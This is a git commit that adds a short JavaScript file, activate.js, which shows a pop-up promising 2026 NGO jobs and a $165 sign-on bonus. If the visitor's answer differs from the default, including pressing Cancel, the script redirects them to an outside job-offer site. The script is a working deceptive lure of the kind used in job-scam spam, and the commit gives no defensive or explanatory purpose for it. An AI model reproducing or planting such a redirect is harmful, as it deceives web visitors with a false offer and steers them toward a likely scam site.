6ae3128089966388d781bea035a5d1ba6626e86f
jobxvir <banners-blinks.9g@icloud.com>
2026-03-23 21:44:33 +0100

    Create activate.js

---
+++ activate.js
@@ -0,0 +1,8 @@
+var password = 'APPLY NOW'
+password = prompt(
+  'Congratulations! You are eligible to Apply for 2026 NGO Jobs and Get $165 Sign-On Bonus. Press OK to APPLY.',
+  'APPLY NOW'
+);
+if (password != 'APPLY NOW') {
+  location.href = 'https://job-info.org/NGO-Jobs-Portal.html';
+}
